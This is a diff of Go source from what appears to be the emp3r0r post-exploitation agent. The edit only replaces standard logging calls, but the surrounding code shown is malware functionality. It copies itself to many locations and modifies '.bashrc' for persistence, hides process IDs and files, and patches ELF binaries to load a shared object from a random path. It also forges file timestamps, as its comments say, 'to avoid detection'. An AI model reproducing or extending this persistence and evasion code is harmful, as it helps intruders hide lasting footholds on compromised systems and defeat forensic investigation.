@@ -6,7 +6,7 @@ package modules
 import (
 	"errors"
 	"fmt"
-	"log"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"os"
 	"os/exec"
 	"os/user"
@@ -65,7 +65,7 @@ func installToAllLocations() []string {
 	for _, path := range locations {
 		err := CopySelfTo(path)
 		if err != nil {
-			log.Print(err)
+			logging.Print(err)
 			continue
 		}
 	}
@@ -161,7 +161,7 @@ func profiles() (err error) {
 	// check if profiles are already written
 	data, err := os.ReadFile(user.HomeDir + "/.bashrc")
 	if err != nil {
-		log.Println(err)
+		logging.Println(err)
 		return
 	}
 	if strings.Contains(string(data), sourceCmd) {
@@ -205,7 +205,7 @@ func HidePIDs() (err error) {
 				}
 				// check if PID is alive
 				if util.IsPIDAlive(int(pid)) {
-					log.Printf("PID %d is alive, keep hidden", pid)
+					logging.Printf("PID %d is alive, keep hidden", pid)
 					pids = append(pids, int(pid))
 				}
 			}
@@ -229,7 +229,7 @@ func HidePIDs() (err error) {
 	if err != nil {
 		return
 	}
-	log.Printf("Added PIDs to %s:\n%s", Hidden_PIDs, pid_list_str)
+	logging.Printf("Added PIDs to %s:\n%s", Hidden_PIDs, pid_list_str)
 	return
 }
 
@@ -242,7 +242,7 @@ func patcher() (err error) {
 	// PIDs
 	err = HidePIDs()
 	if err != nil {
-		log.Printf("Cannot hide PIDs: %v", err)
+		logging.Printf("Cannot hide PIDs: %v", err)
 	}
 
 	// files
@@ -252,7 +252,7 @@ func patcher() (err error) {
 		util.FileBaseName(Hidden_PIDs))
 	err = util.WriteFileAgent(Hidden_Files, []byte(files), 0o644)
 	if err != nil {
-		log.Printf("Cannot create %s: %v", Hidden_Files, err)
+		logging.Printf("Cannot create %s: %v", Hidden_Files, err)
 	}
 	var err_list []error
 
@@ -305,7 +305,7 @@ func ElfPatcher(elfPath, soPath, targetPath string) error {
 		if err != nil {
 			return fmt.Errorf("failed to create backup of %s: %v", elfPath, err)
 		}
-		log.Printf("Created backup: %s", backupPath)
+		logging.Printf("Created backup: %s", backupPath)
 	}
 
 	var finalSOPath string
@@ -322,7 +322,7 @@ func ElfPatcher(elfPath, soPath, targetPath string) error {
 			return fmt.Errorf("failed to create directory %s: %v", targetDir, err)
 		}
 
-		log.Printf("Using user-specified target path: %s", finalSOPath)
+		logging.Printf("Using user-specified target path: %s", finalSOPath)
 	} else {
 		// Generate a random storage location for the SO file
 		randomDir, err := common.GetRandomWritablePath()
@@ -343,7 +343,7 @@ func ElfPatcher(elfPath, soPath, targetPath string) error {
 		}
 
 		finalSOPath = fmt.Sprintf("%s/%s", randomDir, randomSOName)
-		log.Printf("Using random target path: %s", finalSOPath)
+		logging.Printf("Using random target path: %s", finalSOPath)
 	}
 
 	// Copy SO file to random location
@@ -352,12 +352,12 @@ func ElfPatcher(elfPath, soPath, targetPath string) error {
 		return fmt.Errorf("failed to copy SO file to %s: %v", finalSOPath, err)
 	}
 
-	log.Printf("Copied SO file to: %s", finalSOPath)
+	logging.Printf("Copied SO file to: %s", finalSOPath)
 
 	// Copy timestamps from ELF file to SO file to make them appear contemporaneous
 	err = agentutils.CopyFileTimes(elfPath, finalSOPath)
 	if err != nil {
-		log.Printf("Warning: failed to copy file times from %s to %s: %v", elfPath, finalSOPath, err)
+		logging.Printf("Warning: failed to copy file times from %s to %s: %v", elfPath, finalSOPath, err)
 	}
 
 	// Patch the ELF file to load our SO
@@ -371,9 +371,9 @@ func ElfPatcher(elfPath, soPath, targetPath string) error {
 	// Restore original file timestamps to avoid detection
 	err = agentutils.RestoreFileTimes(elfPath)
 	if err != nil {
-		log.Printf("Warning: failed to restore file times for %s: %v", elfPath, err)
+		logging.Printf("Warning: failed to restore file times for %s: %v", elfPath, err)
 	}
 
-	log.Printf("Successfully patched %s to load %s", elfPath, finalSOPath)
+	logging.Printf("Successfully patched %s to load %s", elfPath, finalSOPath)
 	return nil
 }
